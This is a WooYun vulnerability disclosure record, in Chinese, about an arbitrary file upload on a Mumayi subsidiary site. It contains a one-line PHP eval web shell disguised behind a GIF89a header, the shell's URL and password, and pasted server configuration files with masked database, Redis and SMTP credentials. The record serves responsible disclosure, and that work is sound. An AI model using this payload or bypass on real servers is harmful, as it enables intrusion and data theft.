{"id": 48002, "wybug_id": "wooyun-2014-084662", "wybug_title": "木蚂蚁某站getshell影响多个业务站点", "wybug_corp": "mumayi.com", "wybug_author": "鸟云厂商", "wybug_date": "2014-11-25 18:23", "wybug_open_date": "2015-01-09 18:24", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向公众公开  简要描述： 木蚂蚁某站getshell影响多个业务站点 详细说明：  #1 在木蚂蚁旗下的第七传媒http://mobile7.cn注册了开发者账号，在开发者信息---财务信息---上传证件那里抓包，修改后缀为php。但是服务端对文件头做了检测。所以改PHP文件代码为：\nGIF89a<?php @eval($_POST['pass']);?>\n通过了服务端的验证前端直接返回了路径\n\n菜刀连接http://mobile7.cn/Public/upload/cache/3eab38bede51f782b04b7e31aa687bfc.php密码：pass影响站点：\n木蚂蚁wordpresspassport.mumayi.comwan.mumayi.comopen.mumayi.comandroid77.commobile7.cn119.cc\n证明：\n\n\n\n泄露了2012-2014年的开发者身份证照片、营业执照。数据量没做估计\n\n泄露数据库连接信息/var/html/corp_open/www.mobile7.cn/Conf/config.php\n<?php//上线配置return array(    'URL_MODEL'=>3, // 如果你的环境不支持PATHINFO 请设置为3    'DB_TYPE'=>'mysql',    'DB_HOST'=>'17*******09',    'DB_NAME'=>'m*******ayi',    'DB_USER'=>'m*******yi',    'DB_PWD'=>',A*******Z',    'DB_PORT'=>'3306',    'DB_PREFIX'=>'*******_',    'SESSION_PREFIX'=>'think',    'SESSION_EXPIRE' => 3600*7,     // 默认Session有效期    'URL_CASE_INSENSITIVE' =>true,    'ACTIVITY_REGIST' => FALSE,     //活动状态    'TMP_AUTH_UPLOAD_DIR' => dirname(dirname(__FILE__)));\n/var/html/corp_open/open_mumayi/market/redis/redis.class.php\n<?php$RedisConfig = @require_once(\"/mnt/html/redis_config/config.php\");class EggRedis{\tpublic $host = '1*******4';\tpublic $port = 6***9;\tpublic $password = \"m*********Ta\";\n/var/html/corp_open/wan_mumayi/include/Email.php\n////////////////////////////////////////////////    function __construct(){\t\t$this->CharSet    = 'utf-8';\t\t$this->IsSMTP();\t\t$this->SMTPAuth   = true;                       // enable SMTP authentication\t\t//$this->SMTPSecure = \"ssl\";                    //gmail sets the prefix to the servier\t\t$this->Host       = \"smtp.163.com\";           // sets GMAIL as the SMTP server\t\t$this->Port       = 25;                         //gmail set the SMTP port for the GMAIL server\t\t$this->Username   = \"c*******el@163.com\";        // smtp 用户\t\t$this->Password   = 'w*******4';                 // smtp密码\t\t$this->AddReplyTo(\"c*******l@163.com\",\"木蚂蚁网络\");//邮件回复给谁\t\t$this->From       = \"cui*******el@163.com\"; //发信人邮箱\t\t$this->FromName   = \"木蚂蚁网络\";//发信人姓名\n\ndefine('DBHOST', '1*******2');define('DBUSER', 'w*******yi');define('DBPASSWD', 'H*******f');define('DBNAME', 'w*******yi');define('DBPREFIX', 'w*******_');\n   漏洞证明：     修复方案：  上传文件的目录设置成不解析PHP   版权声明：转载请注明来源 鸟云厂商@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-11-25 18:28 厂商回复： 技术蚂蚁正在修复，非常感谢 最新状态： 2014-11-25：已经修复完毕，感谢  ", "replys": "漏洞评价：\n评论\n     2014-11-25 18:51 |    \t\t木蚂蚁应用市场(乌云厂商)\t\t \n  感谢提醒，已经索要联系方式，随后会送上礼品一份，感谢    \n     2014-12-27 08:47 |    \t\tCh丶0nly \t\t\t( 普通白帽子  |\t\t\t        Rank:205 漏洞数:50        | 专注网络30年。)\t\t \n  这样的厂商不多了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}